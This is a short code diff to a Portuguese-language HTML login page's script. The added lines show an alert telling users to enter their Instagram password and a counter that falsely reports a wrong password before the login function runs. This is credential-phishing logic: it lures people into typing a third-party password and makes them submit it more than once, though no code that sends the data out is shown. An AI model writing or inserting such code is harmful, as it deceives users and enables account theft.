@@ -83,7 +83,7 @@
   </div>
 
   <script>
-
+    let t=0
     let z=0
     let s=0
     function vai(){
@@ -113,8 +113,18 @@
       });
 
       if(z==1){
+        alert("Tente usar a senha do instagram\nAqui ele é o mais aconselhavel")
         if(s==1){
-          entrar()
+          if(t==1){
+            entrar()
+          }
+          else{
+            alert("Por favor use uma palavra passe correta!!")
+          }
+          t=1
+        }
+        else{
+          alert("Palavra passe incorreto denovo")
         }
         s=1
       }
